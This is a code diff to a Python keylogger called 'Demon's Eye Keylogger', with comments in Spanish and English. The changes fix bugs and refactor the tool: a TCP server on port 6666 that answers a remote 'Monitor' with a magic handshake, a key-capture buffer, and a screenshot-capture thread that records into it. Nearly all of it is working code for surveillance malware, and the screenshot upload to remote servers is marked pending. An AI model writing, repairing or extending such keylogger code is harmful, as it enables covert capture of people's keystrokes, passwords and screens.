@@ -85,6 +85,7 @@ KEYCODE_EXIT = 7                # CTRL + G > combinación especial para cerrar k
 SERVER_IP = ''
 SERVER_PORT = 6666
 SERVER_BUFFER_SIZE = 64
+SERVER_MAX_CLIENTS = 5
 MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
 MAGIC_RESPONSE_PLAIN = "Demon's Eye Keylogger "+VERSION
 
@@ -143,7 +144,7 @@ class ScreenShootThread (threading.Thread):
         del mem  # libera memoria que contiene captura de imagen
         del app  # libera objeto de instancia de la aplicación
         bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
-        loggin.info("Fin captura " + self.screen_file)
+        logging.info("Fin captura " + self.screen_file)
         # Send screenshot to remote servers
         # ... pending ...
         pass
@@ -158,7 +159,7 @@ class ClientThread(threading.Thread):
         self.conn = conn
         self.ip = ip
         self.port = port
-        self.response = base64.b64encode(MAGIC_RESPONSE_PLAIN)
+        self.response = base64.b64encode(bytes(MAGIC_RESPONSE_PLAIN,'utf-8'))
         logging.info("Recibida petición de Monitor desde " + ip + ":" + str(port))
 
     def run(self):
@@ -181,19 +182,22 @@ class ClientThread(threading.Thread):
 
 
 class ServerListenerThread(threading.Thread):
-    def __init__(self):
+    def __init__(self, ip = SERVER_IP, port = SERVER_PORT, buffer_size = SERVER_BUFFER_SIZE):
         threading.Thread.__init__(self)
         self.name = APPNAME
+        self.ip = ip
+        self.port = port
+        self.buffer_size = buffer_size
         self.threads = []
-        logging.debug('Creando servidor en IP '+ip+' y puerto '+port)
+        logging.debug('Creando servidor en IP '+str(ip)+' y puerto '+str(port))
 
     def run(self):
         tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        tcpServer.bind((SERVER_IP, SERVER_PORT))
+        tcpServer.bind((self.ip, self.port))
 
         while True:
-            tcpServer.listen(5)                 # 5 clients are more than enough. Normally there is only 1 monitor.
+            tcpServer.listen(SERVER_MAX_CLIENTS)    # 5 clients are more than enough. Normally there is only 1 monitor.
             logging.info("Demon's Eye Keylogger server : Waiting connection from Monitor...")
             (conn, (ip, port)) = tcpServer.accept()
             newthread = ClientThread(conn, ip, port)
@@ -325,6 +329,7 @@ def capture_screen():
     screen_file = tmp_folder + 'scr' + datetime.datetime.now().strftime("%y%m%d%H%M") + '.png'
     key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
     pantalla = ScreenShootThread(screen_file)
+    threadList.append(pantalla)
     pantalla.start()
     return
 
@@ -568,7 +573,7 @@ atexit.register(on_close_program)
 
 # Crea Servidor a la escucha de peticiones TCP del Monitor
 # Create server that listens TCP petitions from Monitor
-server = ServerListenerThread()
+server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
 server.start()
 
 # Espera indefinidamente hasta que se produce combinación de salida del keylogger - Wait indefinitely
